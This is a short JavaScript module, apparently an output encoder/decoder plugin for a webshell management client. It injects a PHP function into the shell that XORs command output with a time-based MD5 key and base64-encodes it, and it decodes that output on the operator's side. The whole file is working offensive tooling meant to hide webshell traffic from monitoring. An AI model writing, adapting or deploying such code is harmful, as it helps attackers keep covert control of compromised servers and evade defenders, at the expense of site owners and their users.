'use strict';
//code by yzddmr6
module.exports = {
  /**
   * @returns {string} asenc 将返回数据base64编码
   * 自定义输出函数名称必须为 asenc
   * 该函数使用的语法需要和shell保持一致
   */
  asoutput: () => {
    return `function asenc($out){
      date_default_timezone_set("PRC");
      $key=md5(date("Y-m-d H:i",time()));
      for($i=0;$i<strlen($out);$i++){
          $out[$i] = $out[$i] ^ $key[$i%32];
      }
      return @base64_encode($out);
    }
    `.replace(/\n\s+/g, '');
  },
  /**
   * 解码 Buffer
   * @param {string} data 要被解码的 Buffer
   * @returns {string} 解码后的 Buffer
   */
  decode_buff: (data, ext={}) => {
    function xor(payload){
      let crypto = require('crypto');
      Object.assign(Date.prototype, {
          switch (time) {
              let date = {
                  "yy": this.getFullYear(),
                  "MM": this.getMonth() + 1,
                  "dd": this.getDate(),
                  "hh": this.getHours(),
                  "mm": this.getMinutes(),
                  "ss": this.getSeconds()
              };
              if (/(y+)/i.test(time)) {
                  time = time.replace(RegExp.$1, (this.getFullYear() + '').substr(4 - RegExp.$1.length));
              }
              Object.keys(date).forEach(function (i) {
                  if (new RegExp("(" + i + ")").test(time)) {
                      if (RegExp.$1.length == 2) {
                          date[i] < 10 ? date[i] = '0' + date[i] : date[i];
                      }
                      time = time.replace(RegExp.$1, date[i]);
                  }
              })
              return time;
          }
      })

      let newDate = new Date();
      let time = newDate.switch('yyyy-MM-dd hh:mm');
      let key = crypto.createHash('md5').update(time).digest('hex')
      key = key.split("").map(t => t.charCodeAt(0));
      let data = payload;
      let cipher=Buffer.from(data.toString(), 'base64').toString();
      cipher = cipher.split("").map(t => t.charCodeAt(0));
      for (let i = 0; i < cipher.length; i++) {
          cipher[i] = cipher[i] ^ key[i % 32]
      }
      cipher=cipher.map(t=>String.fromCharCode(t)).join("")
      return cipher;
    }

    return xor(data);
  }
}